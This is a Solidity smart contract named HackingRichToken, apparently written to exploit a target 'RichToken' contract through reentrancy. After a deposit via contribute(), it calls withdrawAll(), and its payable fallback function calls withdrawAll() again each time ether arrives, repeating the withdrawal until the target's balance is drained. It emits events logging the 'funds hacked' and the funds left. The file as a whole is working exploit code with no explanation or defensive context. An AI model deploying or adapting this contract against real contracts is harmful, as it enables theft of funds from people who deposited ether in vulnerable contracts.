pragma solidity ^0.5.16;

interface RichTokenInterface{

  function contribute() external payable returns (uint);

  //withdraw your eth
  function withdrawAll() external payable returns (uint);

}


contract HackingRichToken{

    address richToken;
    address payable hacker;

    constructor () public{
        hacker = msg.sender;
    }


    function setRichTokenAddress(address _richToken) public {
        richToken = _richToken;
    }

    function contributeToRich() public payable {
        RichTokenInterface(richToken).contribute.value(msg.value)();
    }

    function HackRich() public {
        RichTokenInterface(richToken).withdrawAll();
    }

    event gasLeft(uint _gasLeft);
    event FundsLeftInRich(uint _balance);

    event HackingStatus(uint gasLeft, uint fundsHacked, uint fundsLeft);

    function () payable external {

        emit HackingStatus(gasleft(), address(this).balance, address(richToken).balance);

        RichTokenInterface(richToken).withdrawAll();
    }
}
